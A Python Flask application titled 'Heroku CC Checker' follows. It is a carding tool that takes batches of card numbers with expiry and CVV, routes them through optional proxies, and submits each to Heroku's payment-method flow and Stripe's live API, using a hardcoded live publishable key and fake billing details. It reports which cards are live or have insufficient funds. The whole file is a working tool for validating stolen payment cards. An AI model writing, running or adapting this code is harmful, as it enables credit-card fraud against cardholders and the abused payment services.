import os
import sys
import aiohttp
import asyncio
import json
import uuid
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
from datetime import datetime

# Auto-install required modules
required_modules = ['flask', 'flask-socketio', 'aiohttp', 'asyncio', 'eventlet']
def install_modules(modules):
    for module in modules:
        try:
            __import__(module.replace('-', '_'))
        except ImportError:
            print(f"{module} not found. Installing...")
            os.system(f"{sys.executable} -m pip install {module}")
            print(f"{module} installed successfully.")
install_modules(required_modules)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins='*')

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Heroku CC Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { 
            background-color: #0f1419; 
            color: #e1e8ed;
        }
        .navbar {
            background-color: #192734;
            border-bottom: 1px solid #38444d;
        }
        .container-box {
            background-color: #192734;
            border: 1px solid #38444d;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .results-container {
            height: 500px;
            overflow-y: auto;
            background-color: #15202b;
            border: 1px solid #38444d;
            border-radius: 12px;
            padding: 15px;
        }
        .result-item {
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            font-family: 'Monaco', monospace;
            font-size: 13px;
        }
        .success { 
            background-color: #1e4620;
            border-left: 4px solid #28a745;
        }
        .error { 
            background-color: #461e1e;
            border-left: 4px solid #dc3545;
        }
        .form-control {
            background-color: #15202b;
            border: 1px solid #38444d;
            color: #e1e8ed;
        }
        .form-control:focus {
            background-color: #15202b;
            border-color: #1da1f2;
            color: #e1e8ed;
            box-shadow: 0 0 0 2px rgba(29,161,242,0.2);
        }
        .btn-primary {
            background-color: #1da1f2;
            border: none;
        }
        .btn-primary:hover {
            background-color: #1a91da;
        }
        .status-badge {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
        }
        #status {
            font-size: 14px;
            padding: 5px 10px;
            border-radius: 15px;
            background-color: #15202b;
        }
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #15202b;
        }
        ::-webkit-scrollbar-thumb {
            background: #38444d;
            border-radius: 4px;
        }
        .counter {
            font-size: 13px;
            color: #8899a6;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-dark mb-4">
        <div class="container">
            <span class="navbar-brand mb-0 h1">Heroku CC Checker</span>
        </div>
    </nav>
    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <div class="container-box">
                    <h5 class="mb-3">CC Input</h5>
                    <div class="mb-3">
                        <textarea id="ccInput" class="form-control mb-3" rows="5" 
                            placeholder="Format: 4242424242424242|12|2024|123"></textarea>
                        <div class="d-flex justify-content-between align-items-center">
                            <span class="counter">Cards: <span id="ccCount">0</span>/50</span>
                            <button id="startBtn" class="btn btn-primary">Start Checking</button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="container-box">
                    <h5 class="mb-3">Settings</h5>
                    <input type="text" id="apiKey" class="form-control mb-3" placeholder="Heroku API Key">
                    <input type="text" id="proxyInput" class="form-control" placeholder="Proxy (Optional) - ip:port:user:pass">
                </div>
            </div>
        </div>
        
        <div class="container-box">
            <div class="d-flex justify-content-between align-items-center mb-3">
                <h5 class="mb-0">Live Results</h5>
                <span id="status" class="text-muted">Ready</span>
            </div>
            <div class="results-container" id="resultsList"></div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let isProcessing = false;
        
        document.getElementById('startBtn').addEventListener('click', async () => {
            if (isProcessing) return;
            
            const apiKey = document.getElementById('apiKey').value;
            const proxy = document.getElementById('proxyInput').value;
            const ccs = document.getElementById('ccInput').value.split('\\n').filter(cc => cc.trim());
            
            if (!apiKey) {
                updateStatus('API Key required');
                return;
            }
            
            if (ccs.length > 50) {
                updateStatus('Maximum 50 CCs allowed');
                return;
            }
            
            isProcessing = true;
            document.getElementById('startBtn').disabled = true;
            updateStatus('Processing...');
            
            for (const cc of ccs) {
                try {
                    const response = await fetch('/check_cc', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cc, api_key: apiKey, proxy})
                    });
                    await new Promise(resolve => setTimeout(resolve, 2000));
                } catch (error) {
                    console.error('Error:', error);
                }
            }
            
            isProcessing = false;
            document.getElementById('startBtn').disabled = false;
            updateStatus('Ready');
        });

        socket.on('cc_result', (data) => {
            const resultsList = document.getElementById('resultsList');
            const resultItem = document.createElement('div');
            resultItem.className = `result-item ${data.status === 'success' || data.status === 'insufficient_funds' ? 'success' : 'error'}`;
            resultItem.innerHTML = `
                <strong>${data.timestamp}</strong> - 
                CC: ${data.cc} - 
                <span class="status-badge ${data.status === 'success' || data.status === 'insufficient_funds' ? 'bg-success' : 'bg-danger'} text-white">
                    ${data.status.toUpperCase()}
                </span>
                ${data.message ? `<br>Message: ${data.message}` : ''}
            `;
            resultsList.insertBefore(resultItem, resultsList.firstChild);
            
            const ccCount = document.getElementById('ccCount');
            const currentCount = parseInt(ccCount.textContent) + 1;
            ccCount.textContent = currentCount;
        });

        function updateStatus(message) {
            document.getElementById('status').textContent = message;
        }
    </script>
</body>
</html>
'''
async def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(session, url, method="POST", params=None, headers=None, data=None, json_data=None):
    try:
        async with session.request(
            method, url, params=params, headers=headers, data=data, json=json_data
        ) as response:
            return await response.text()
    except Exception as e:
        print(f"Request error: {e}")
        return None

async def heroku(cc, api_key, proxy=None):
    try:
        cc, mon, year, cvv = cc.split("|")
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        async with aiohttp.ClientSession() as session:
            headers = {
                "accept": "application/vnd.heroku+json; version=3",
                "accept-language": "en-US,en;q=0.9",
                "authorization": f"Bearer {api_key}",
                "origin": "https://dashboard.heroku.com",
                "priority": "u=1, i",
                "referer": "https://dashboard.heroku.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                "x-heroku-requester": "dashboard",
                "x-origin": "https://dashboard.heroku.com",
            }

            if proxy:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) == 4:
                    session._connector._proxy = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                else:
                    session._connector._proxy = f"http://{proxy}"

            req = await make_request(
                session,
                url="https://api.heroku.com/account/payment-method/client-token",
                headers=headers,
            )
            
            if not req:
                return {"status": "error", "message": "Failed to get client token"}
                
            client_secret = await parseX(req, '"token":"', '"')

            headers2 = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            }

            data = {
                "type": "card",
                "billing_details[name]": "Ahmed Afnan",
                "billing_details[address][city]": "Anchorage",
                "billing_details[address][country]": "US",
                "billing_details[address][line1]": "245 W 5th Ave",
                "billing_details[address][postal_code]": "99501",
                "billing_details[address][state]": "AK",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_month]": mon,
                "card[exp_year]": year,
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/4b35ef0d67; stripe-js-v3/4b35ef0d67; split-card-element",
                "referrer": "https://dashboard.heroku.com",
                "time_on_page": "403570",
                "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
            }

            req2 = await make_request(
                session,
                "https://api.stripe.com/v1/payment_methods",
                headers=headers2,
                data=data,
            )

            if not req2 or "pm_" not in req2:
                return {"status": "error", "message": "Invalid Card"}

            json_sec = json.loads(req2)
            pmid = json_sec["id"]
            piid = client_secret.split("_secret_")[0]

            headers3 = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            }
            
            data3 = {
                "payment_method": pmid,
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
                "client_secret": client_secret,
            }

            req3 = await make_request(
                session,
                url=f"https://api.stripe.com/v1/payment_intents/{piid}/confirm",
                headers=headers3,
                data=data3,
            )

            if not req3:
                return {"status": "error", "message": "Failed to confirm payment"}

            ljson = json.loads(req3)
            if '"status": "succeeded"' in req3:
                return {"status": "success", "message": "Card Added Successfully"}
            elif "insufficient_funds" in req3:
                return {"status": "insufficient_funds", "message": "Card Live - Insufficient Funds"}
            elif "decline_code" in req3:
                return {"status": "declined", "message": ljson["error"]["decline_code"]}
            elif "requires_action" in req3:
                return {"status": "3d_secure", "message": "3D Secure Required"}
            elif "error" in req3:
                return {"status": "error", "message": ljson["error"]["message"]}
            else:
                return {"status": "unknown", "message": "Unknown Response"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check_cc', methods=['POST'])
async def handle_check_cc():
    data = request.get_json()
    cc = data.get('cc')
    api_key = data.get('api_key')
    proxy = data.get('proxy')
    
    result = await heroku(cc, api_key, proxy)
    result['cc'] = cc
    result['timestamp'] = datetime.now().strftime('%H:%M:%S')
    
    socketio.emit('cc_result', result)
    return jsonify({"status": "success"})

if __name__ == '__main__':
    socketio.run(app, debug=False, host='0.0.0.0', port=5000)
